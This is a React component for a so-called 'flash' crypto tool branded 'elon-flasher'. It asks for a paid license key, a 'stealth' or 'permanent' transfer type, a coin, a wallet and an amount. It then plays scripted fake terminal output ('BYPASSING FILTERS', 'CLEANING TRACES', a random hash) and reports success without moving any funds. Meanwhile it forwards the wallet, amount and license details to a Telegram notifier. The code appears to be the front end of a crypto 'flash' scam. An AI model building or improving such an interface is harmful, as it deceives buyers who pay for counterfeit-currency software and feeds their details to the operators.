
import React, { useState, useEffect, useRef } from 'react';
import { Product, SoftwareStage } from '../types.ts';
import { validateLicenseKey, markKeyAsUsed, isKeyAlreadyUsed } from '../services/licenseService.ts';
import { sendTelegramNotification } from '../services/telegramService.ts';

interface SoftwarePortalProps {
  product: Product;
  onClose: () => void;
  onPurchaseRequest: () => void;
}

const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPurchaseRequest }) => {
  const [stage, setStage] = useState<SoftwareStage>('BOOT');
  const [license, setLicense] = useState('');
  const [wallet, setWallet] = useState('');
  const [amount, setAmount] = useState('');
  const [error, setError] = useState('');
  const [logs, setLogs] = useState<string[]>([]);
  
  // Configuration State
  const [flashType, setFlashType] = useState<string>('');
  const [coin, setCoin] = useState<string>('');
  const [network, setNetwork] = useState<string>('');

  const logEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (stage === 'BOOT') {
      const bootLines = [
        `> STARTING ${product.name}...`,
        "> LOADING SYSTEM PROTOCOLS...",
        "> CONNECTING TO SERVERS...",
        "> SECURITY CHECK: PASSED",
        "> PLEASE ENTER YOUR LICENSE KEY..."
      ];
      let i = 0;
      const interval = setInterval(() => {
        if (i < bootLines.length) {
          setLogs(prev => [...prev, bootLines[i]]);
          i++;
        } else {
          clearInterval(interval);
          setTimeout(() => setStage('LICENSE'), 800);
        }
      }, 300);
      return () => clearInterval(interval);
    }
  }, [stage, product.name]);

  useEffect(() => {
    if (stage === 'EXECUTING') {
      const executionLines = [
        `> CONNECTING TO WALLET: ${wallet.slice(0,6)}...${wallet.slice(-4)}`,
        `> METHOD: ${flashType.toUpperCase()}`,
        `> ASSET: ${coin} ${network ? `[${network}]` : ''}`,
        `> PREPARING ${amount} ${coin} TRANSFER...`,
        "> BYPASSING FILTERS...",
        "> OPENING SECURE CONNECTION...",
        "> SENDING DATA STREAM...",
        "> HASH: 0X" + Math.random().toString(16).slice(2, 12).toUpperCase(),
        "> TUNNELING DATA...",
        "> CLEANING TRACES...",
        "> FINISHING TRANSFER..."
      ];
      let i = 0;
      const interval = setInterval(() => {
        if (i < executionLines.length) {
          setLogs(prev => [...prev, executionLines[i]]);
          i++;
        } else {
          clearInterval(interval);
          setTimeout(() => setStage('COMPLETE'), 1500);
        }
      }, 600);
      return () => clearInterval(interval);
    }
  }, [stage, wallet, amount, flashType, coin, network]);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const handleLicenseSubmit = () => {
    const cleanKey = license.trim().toUpperCase();
    
    if (isKeyAlreadyUsed(cleanKey)) {
      setError('KEY ALREADY USED');
      setLogs(prev => [...prev, `> ERROR: THIS KEY HAS ALREADY BEEN USED.`]);
      return;
    }

    if (validateLicenseKey(cleanKey)) {
      setError('');
      setLogs(prev => [...prev, `> KEY VALIDATED: [${cleanKey}]`, `> SYSTEM ACCESS GRANTED.`]);
      setStage('TYPE_SELECT');
    } else {
      setError('INVALID KEY');
      setLogs(prev => [...prev, `> ERROR: INCORRECT LICENSE KEY.`]);
    }
  };

  const handleTypeSelect = (type: string) => {
    setFlashType(type);
    setLogs(prev => [...prev, `> TRANSFER TYPE SET: ${type.toUpperCase()}`]);
    setStage('COIN_SELECT');
  };

  const handleCoinSelect = (selectedCoin: string) => {
    setCoin(selectedCoin);
    setLogs(prev => [...prev, `> TARGET ASSET: ${selectedCoin}`]);
    if (selectedCoin === 'USDT') {
      setStage('NETWORK_SELECT');
    } else {
      setNetwork('');
      setStage('CONFIG');
    }
  };

  const handleNetworkSelect = (selectedNetwork: string) => {
    setNetwork(selectedNetwork);
    setLogs(prev => [...prev, `> NETWORK: ${selectedNetwork}`]);
    setStage('CONFIG');
  };

  const handleFlashSubmit = async () => {
    const numAmount = parseFloat(amount);
    
    if (!wallet || !amount) {
      setError('ALL FIELDS REQUIRED');
      return;
    }

    if (numAmount > product.maxAmount) {
      setError(`LIMIT EXCEEDED: MAX ${product.maxAmount} ${coin}`);
      setLogs(prev => [...prev, `> ERROR: ATTEMPTED ${numAmount} ${coin}. SOFTWARE LIMIT IS ${product.maxAmount} ${coin}.`]);
      return;
    }

    if (numAmount <= 0) {
      setError('INVALID AMOUNT');
      return;
    }

    setError('');
    setStage('EXECUTING');
    
    markKeyAsUsed(license);

    await sendTelegramNotification({
      product: product.name,
      wallet,
      amount: `${amount} ${coin} (${flashType})`,
      license
    });
  };

  return (
    <div className="fixed inset-0 z-[1000] flex items-center justify-center bg-black/90 backdrop-blur-xl p-0 md:p-4 lg:p-8">
      <div className="w-full h-full md:max-w-4xl md:h-auto md:max-h-[90vh] glass-panel md:rounded-[2rem] border-0 md:border-2 border-[#0aff0a]/30 shadow-[0_0_80px_rgba(10,255,10,0.15)] overflow-hidden flex flex-col animate-fade-in">
        {/* Terminal Header */}
        <div className="p-4 md:p-5 bg-[#0a1a0a] border-b border-[#0aff0a]/20 flex justify-between items-center">
          <div className="flex items-center gap-3 md:gap-4">
            <div className="flex gap-1.5 md:gap-2">
              <div className="w-2.5 h-2.5 rounded-full bg-red-500/40"></div>
              <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/40"></div>
              <div className="w-2.5 h-2.5 rounded-full bg-[#0aff0a] animate-pulse"></div>
            </div>
            <span className="font-mono text-[8px] md:text-[10px] font-black text-[#0aff0a]/70 uppercase tracking-[0.1em] md:tracking-[0.2em] truncate max-w-[150px] md:max-w-none">
              system@elon-flasher:/{product.id}/setup
            </span>
          </div>
          <button onClick={onClose} className="text-white/40 hover:text-red-500 transition-colors p-1">
            <i className="fas fa-times-circle text-lg md:text-xl"></i>
          </button>
        </div>

        {/* Output Console */}
        <div className="flex-1 overflow-y-auto p-4 md:p-10 font-mono text-[10px] md:text-sm text-[#0aff0a] space-y-2 md:space-y-3 bg-black/60 scroll-smooth">
          {logs.map((log, i) => (
            <div key={i} className="flex gap-3 md:gap-4 opacity-90 animate-fade-in">
              <span className="opacity-30 flex-shrink-0 hidden sm:inline">[{new Date().toLocaleTimeString([], { hour12: false })}]</span>
              <span className="leading-relaxed">{log}</span>
            </div>
          ))}
          <div ref={logEndRef} />
          
          {/* Step 1: License */}
          {stage === 'LICENSE' && (
            <div className="mt-4 md:mt-8 p-6 md:p-10 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-2xl md:rounded-3xl animate-fade-in space-y-4 md:space-y-6">
              <h4 className="font-orbitron font-black text-base md:text-xl text-center tracking-wider md:tracking-widest text-[#0aff0a]">LICENSE CHECK</h4>
              <div className="flex flex-col gap-3 md:gap-4">
                <input
                  type="text"
                  placeholder="PASTE YOUR KEY HERE"
                  value={license}
                  onChange={(e) => setLicense(e.target.value)}
                  className="w-full bg-black/60 border border-[#0aff0a]/30 rounded-xl px-4 py-3.5 md:py-4 text-center text-base md:text-lg font-bold tracking-[0.1em] md:tracking-[0.2em] text-[#0aff0a] outline-none focus:border-[#0aff0a] transition-all"
                />
                <button 
                  onClick={handleLicenseSubmit}
                  className="w-full py-4 bg-[#0aff0a] text-black font-black uppercase rounded-xl hover:bg-[#00ffaa] active:scale-95 transition-all shadow-[0_0_20px_rgba(10,255,10,0.3)]"
                >
                  START SYSTEM
                </button>
              </div>
              <div className="text-center">
                <button onClick={onPurchaseRequest} className="text-[8px] md:text-[10px] text-[#0aff0a]/60 hover:text-[#0aff0a] font-bold uppercase tracking-widest transition-colors">
                  I don't have a key yet
                </button>
              </div>
              {error && <p className="text-red-500 font-bold text-center text-[9px] md:text-[10px] animate-pulse uppercase tracking-widest">{error}</p>}
            </div>
          )}

          {/* Step 2: Flash Type Choice */}
          {stage === 'TYPE_SELECT' && (
            <div className="mt-4 md:mt-8 p-4 md:p-8 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-2xl md:rounded-3xl animate-fade-in space-y-4 md:space-y-6">
              <h4 className="font-orbitron font-black text-sm md:text-lg text-center tracking-widest text-[#0aff0a] uppercase">SELECT TRANSFER TYPE</h4>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 md:gap-4">
                {[
                  { id: 'tradable', title: 'TRADABLE', desc: 'Standard Liquid Funds' },
                  { id: 'permanent', title: 'PERMANENT', desc: 'Fixed Balance' },
                  { id: 'undetectable', title: 'STEALTH', desc: 'Hidden Transaction' },
                  { id: 'all', title: 'OMEGA', desc: 'Full Access Mode' }
                ].map((t) => (
                  <button
                    key={t.id}
                    onClick={() => handleTypeSelect(t.id)}
                    className="p-4 md:p-5 bg-black/60 border border-[#0aff0a]/20 rounded-xl md:rounded-2xl text-left hover:border-[#0aff0a] hover:bg-[#0aff0a]/10 transition-all group"
                  >
                    <p className="font-black text-[#0aff0a] text-xs md:text-sm group-hover:scale-105 transition-transform">{t.title}</p>
                    <p className="text-[8px] md:text-[9px] text-[#0aff0a]/40 uppercase mt-0.5 font-bold">{t.desc}</p>
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* Step 3: Coin Choice */}
          {stage === 'COIN_SELECT' && (
            <div className="mt-4 md:mt-8 p-6 md:p-8 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-2xl md:rounded-3xl animate-fade-in space-y-6">
              <h4 className="font-orbitron font-black text-sm md:text-lg text-center tracking-widest text-[#0aff0a] uppercase">SELECT ASSET</h4>
              <div className="grid grid-cols-2 sm:flex sm:flex-wrap justify-center gap-4 md:gap-6">
                {[
                  { id: 'BITCOIN', icon: 'fa-bitcoin' },
                  { id: 'USDT', icon: 'fa-dollar-sign' },
                  { id: 'SOLANA', icon: 'fa-sun' }
                ].map((c) => (
                  <button
                    key={c.id}
                    onClick={() => handleCoinSelect(c.id)}
                    className="flex flex-col items-center justify-center bg-black/60 border border-[#0aff0a]/20 rounded-2xl md:rounded-[2rem] p-4 md:w-32 md:h-32 hover:border-[#0aff0a] hover:scale-105 transition-all group"
                  >
                    <i className={`fab ${c.icon} text-3xl md:text-4xl mb-2 md:mb-3 text-[#0aff0a] group-hover:animate-bounce`}></i>
                    <p className="font-black text-[8px] md:text-[10px] tracking-widest">{c.id}</p>
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* Step 4: Network Choice */}
          {stage === 'NETWORK_SELECT' && (
            <div className="mt-4 md:mt-8 p-6 md:p-8 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-2xl md:rounded-3xl animate-fade-in space-y-6">
              <h4 className="font-orbitron font-black text-sm md:text-lg text-center tracking-widest text-[#0aff0a] uppercase">SELECT NETWORK</h4>
              <div className="flex flex-col sm:flex-row justify-center gap-3 md:gap-4">
                {['TRC20', 'ERC20'].map((n) => (
                  <button
                    key={n}
                    onClick={() => handleNetworkSelect(n)}
                    className="flex-1 py-5 md:py-6 bg-black/60 border border-[#0aff0a]/20 rounded-xl font-black text-[#0aff0a] hover:bg-[#0aff0a] hover:text-black transition-all tracking-[0.3em] text-xs md:text-sm"
                  >
                    {n}
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* Step 5: Final Config */}
          {stage === 'CONFIG' && (
            <div className="mt-4 md:mt-8 p-5 md:p-10 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-2xl md:rounded-3xl animate-fade-in space-y-6 md:space-y-8">
              <div className="text-center space-y-2">
                <h4 className="font-orbitron font-black text-base md:text-xl tracking-widest text-[#0aff0a]">TRANSFER SETUP</h4>
                <div className="flex flex-wrap justify-center gap-2">
                   <span className="text-[8px] md:text-[9px] bg-[#0aff0a]/20 px-2 py-1 rounded text-[#0aff0a] font-black uppercase">{flashType}</span>
                   <span className="text-[8px] md:text-[9px] bg-[#0aff0a]/20 px-2 py-1 rounded text-[#0aff0a] font-black uppercase">{coin}</span>
                   {network && <span className="text-[8px] md:text-[9px] bg-[#0aff0a]/20 px-2 py-1 rounded text-[#0aff0a] font-black uppercase">{network}</span>}
                </div>
              </div>
              
              <div className="space-y-5 md:space-y-6 max-w-xl mx-auto">
                <div className="space-y-2">
                  <label className="text-[9px] md:text-[10px] font-black uppercase tracking-[0.2em] text-[#0aff0a]/60 ml-1">Wallet Address</label>
                  <input
                    type="text"
                    placeholder="Paste recipient address..."
                    value={wallet}
                    onChange={(e) => setWallet(e.target.value)}
                    className="w-full bg-black/80 border border-[#0aff0a]/30 rounded-xl px-4 py-3.5 md:py-4 font-mono text-xs md:text-sm text-[#0aff0a] outline-none focus:border-[#0aff0a] transition-all"
                  />
                </div>
                <div className="space-y-2">
                  <div className="flex justify-between px-1">
                    <label className="text-[9px] md:text-[10px] font-black uppercase tracking-[0.2em] text-[#0aff0a]/60">Amount to send</label>
                    <span className="text-[8px] md:text-[9px] font-mono text-[#0aff0a]/40">LIMIT: {product.maxAmount} {coin}</span>
                  </div>
                  <input
                    type="number"
                    placeholder="0.00"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    className="w-full bg-black/80 border border-[#0aff0a]/30 rounded-xl px-4 py-3.5 md:py-4 font-mono text-xs md:text-sm text-[#0aff0a] outline-none focus:border-[#0aff0a] transition-all"
                  />
                </div>
              </div>

              {error && <p className="text-red-500 font-bold text-center text-[9px] md:text-[10px] animate-pulse uppercase tracking-widest">{error}</p>}

              <button 
                onClick={handleFlashSubmit}
                className="w-full max-w-xl mx-auto py-4 md:py-5 bg-[#0aff0a] text-black font-black uppercase rounded-xl hover:bg-[#00ffaa] shadow-[0_10px_40px_rgba(10,255,10,0.3)] active:scale-[0.98] transition-all flex items-center justify-center gap-3 text-xs md:text-sm"
              >
                <i className="fas fa-bolt"></i> START TRANSFER
              </button>
            </div>
          )}

          {stage === 'EXECUTING' && (
            <div className="fixed inset-0 z-[1100] flex flex-col items-center justify-center p-4">
               <div className="glass-panel p-8 md:p-12 rounded-full border-2 border-[#0aff0a] animate-pulse shadow-[0_0_120px_rgba(10,255,10,0.4)] bg-black/80">
                 <i className="fas fa-satellite-dish text-4xl md:text-6xl text-[#0aff0a]"></i>
               </div>
               <div className="mt-8 md:mt-10 text-center space-y-4 bg-black/90 p-6 md:p-8 rounded-2xl border border-[#0aff0a]/20 backdrop-blur-md w-full max-w-xs md:max-w-md">
                 <h2 className="font-orbitron font-black text-lg md:text-2xl text-[#0aff0a] tracking-widest uppercase">SENDING ASSETS</h2>
                 <p className="text-[9px] md:text-xs text-[#b0ffb0] animate-pulse font-mono uppercase">Please wait...</p>
                 <div className="w-full bg-white/5 h-1 rounded-full overflow-hidden mt-6">
                    <div className="bg-[#0aff0a] h-full animate-[progress_10s_linear_infinite]" style={{ width: '40%' }}></div>
                 </div>
               </div>
            </div>
          )}

          {stage === 'COMPLETE' && (
            <div className="mt-4 md:mt-8 p-8 md:p-12 text-center space-y-8 md:space-y-10 animate-fade-in">
              <div className="w-24 h-24 md:w-32 md:h-32 bg-[#0aff0a] text-black rounded-[2rem] md:rounded-[2.5rem] flex items-center justify-center mx-auto shadow-[0_0_60px_rgba(10,255,10,0.6)] rotate-6">
                <i className="fas fa-check-double text-4xl md:text-5xl"></i>
              </div>
              <div className="space-y-3 md:space-y-4">
                <h3 className="font-orbitron text-2xl md:text-4xl font-black text-[#0aff0a] tracking-tighter uppercase">SUCCESS</h3>
                <p className="text-[10px] md:text-sm text-[#b0ffb0]/70 max-w-md mx-auto leading-relaxed">Your transfer has been processed successfully. Status: <b>Completed</b>.</p>
              </div>
              <button 
                onClick={onClose}
                className="w-full max-w-xs mx-auto py-4 md:py-5 border-2 border-[#0aff0a] text-[#0aff0a] font-black uppercase rounded-xl md:rounded-2xl hover:bg-[#0aff0a] hover:text-black transition-all text-xs md:text-sm"
              >
                CLOSE WINDOW
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default SoftwarePortal;